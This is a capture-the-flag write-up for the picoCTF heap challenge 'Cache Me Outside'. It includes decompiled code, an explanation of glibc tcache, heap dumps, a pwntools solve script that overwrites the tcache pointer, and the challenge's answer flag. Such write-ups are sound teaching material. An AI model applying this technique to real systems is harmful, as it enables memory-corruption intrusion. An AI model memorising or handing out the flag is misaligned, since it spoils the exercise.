# Cache Me Outside

## Category - Binary Exploitation
## Author - MADSTACKS

### Description: 
While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6

### Solution:
The challenge gives us a link to download the ELF executable, a Makefile, and a libc version. This is probably the libc version used on the remote server so we know we must use
it when running our binary. To ensure this we run patchelf as such:
```
patchelf  --set-interpreter ./ld-2.27.so ./heapedit
```
Now we can run the binary with
```
./heapedit
```
To begin then we can decompile the program with Ghidra:
```C
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined user_value;
  int user_address;
  int i;
  undefined8 *p_buf_first;
  undefined8 *p_buf;
  FILE *flag_fd;
  undefined8 *p_buf_last;
  void *local_80;
  char local_78 [32];
  char flag [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_fd = fopen("flag.txt","r");
  fgets(flag,0x40,flag_fd);
  local_78._0_8_ = 0x2073692073696874; 
  local_78._8_8_ = 0x6d6f646e61722061;
  local_78._16_8_ = 0x2e676e6972747320;
  local_78[24] = '\0';
  p_buf_first = (undefined8 *)0x0;
  i = 0;
  while (i < 7) {
    p_buf = (undefined8 *)malloc(0x80);
    if (p_buf_first == (undefined8 *)0x0) {
      p_buf_first = p_buf;
    }
    *p_buf = 0x73746172676e6f43;
    p_buf[1] = 0x662072756f592021;
    p_buf[2] = 0x203a73692067616c;
    *(undefined *)(p_buf + 3) = 0;
    strcat((char *)p_buf,flag);
    i = i + 1;
  }
  p_buf_last = (undefined8 *)malloc(0x80);
  *p_buf_last = 0x5420217972726f53;
  p_buf_last[1] = 0x276e6f7720736968;
  p_buf_last[2] = 0x7920706c65682074;
  *(undefined4 *)(p_buf_last + 3) = 0x203a756f;
  *(undefined *)((long)p_buf_last + 0x1c) = 0;
  strcat((char *)p_buf_last,local_78);
  free(p_buf);
  free(p_buf_last);
  user_address = 0;
  user_value = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&user_address);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&user_value);
  *(undefined *)((long)user_address + (long)p_buf_first) = user_value;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We see that the program allocates some memory and frees it but allows us to change one byte in the program to get the flag. I knew very little about GLIBC's tcache before starting
this challenge and this video really helped me understand what was going on: https://www.youtube.com/watch?v=0jHtqqdVv1Y. Make sure to watch it to get a better understanding. 
Essentially tcache is like a recycling bin of sorts for freed chunks of memory and allows them to be reused when the program allocates some memory with malloc() that is of the 
same size as a chunk in the tcache. The tcache is ordered as an ordered list containing these chunks of various sizes that all point to each other. We can look at the chunks in
use during the program using gdb gef's "heap chunks" feature and look at the tcache with "heap bins" as such:
```
gef➤  heap bins
─────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7fa8b80 ───────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603880, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x6037f0, size=0x90, flags=PREV_INUSE)
──────────────────────────────────────────────────────────────────── Fastbins for arena 0x7ffff7fa8b80 ────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────────────────────────── Large Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  heap chunks
Chunk(addr=0x602010, size=0x290, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00    ................]
Chunk(addr=0x6022a0, size=0x1e0, flags=PREV_INUSE)
    [0x00000000006022a0     88 24 ad fb 00 00 00 00 95 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602480, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602480     70 69 63 6f 43 54 46 7b 74 68 69 73 69 73 61 74    picoCTF{thisisat]
Chunk(addr=0x603490, size=0x90, flags=PREV_INUSE)
    [0x0000000000603490     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603520, size=0x90, flags=PREV_INUSE)
    [0x0000000000603520     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035b0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035b0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603640, size=0x90, flags=PREV_INUSE)
    [0x0000000000603640     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036d0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036d0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603760, size=0x90, flags=PREV_INUSE)
    [0x0000000000603760     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6037f0, size=0x90, flags=PREV_INUSE)
    [0x00000000006037f0     00 00 00 00 00 00 00 00 10 20 60 00 00 00 00 00    ......... `.....]
Chunk(addr=0x603880, size=0x90, flags=PREV_INUSE)
    [0x0000000000603880     f0 37 60 00 00 00 00 00 10 20 60 00 00 00 00 00    .7`...... `.....]
Chunk(addr=0x603910, size=0x410, flags=PREV_INUSE)
    [0x0000000000603910     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x603d20, size=0x1f2f0, flags=PREV_INUSE)  ←  top chunk
```
Seeing as one of the heap chunks contains the flag we figured we can cause the program to print this chunk instead. What the program does is it calls malloc() with size 0x80 to
allocate a chunk from the tcache recycling bin and then prints it out. The chunk that is taken out of the tcache when this happens is referred to by something called the tcache
per struct which is at the very start of the heap in memory. Thus, by having this tcache per struct point to the flag chunk instead of the chunk in the tcache we can have it pull
that chunk out and print out its contents. The byte of the tcache per struct that needs to be changed is located at "0x602088" so we must subtract the place were our input is 
referring from which is "0x6034a0" to get the right offset at which to place our byte value.
```
gef>  p/d 0x602088 - 0x6034a0
$6 = -5144
```
Now we must change the value of the byte to be 0x08 to instead point to the location of one of the flags in memory:
```
gef➤  search-pattern pico
[+] Searching 'pico' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602480 - 0x602496  →   "picoCTF{thisisatest}\n"
  0x6034a8 - 0x6034be  →   "picoCTF{thisisatest}\n"
  0x603538 - 0x60354e  →   "picoCTF{thisisatest}\n"
  0x6035c8 - 0x6035de  →   "picoCTF{thisisatest}\n"
  0x603658 - 0x60366e  →   "picoCTF{thisisatest}\n"
  0x6036e8 - 0x6036fe  →   "picoCTF{thisisatest}\n"
  0x603778 - 0x60378e  →   "picoCTF{thisisatest}\n"
  0x603808 - 0x60381e  →   "picoCTF{thisisatest}\n"
```
Note that this was locally where I was using a test flag of "picoCTF{thisisatest}".
  
Thus our first input to the program must be -5144 and the second must be the byte value of 0x08. Final solve script:
```python
from pwn import *

r = remote("mercury.picoctf.net", 49825) #replace with your own port

r.sendlineafter("Address:", "-5144")
r.sendlineafter("Value:", b'\x08')

print(r.recvall())
```

### Flag:
```
picoCTF{53be92758865dfd2779fa96526dbd0a3}
```
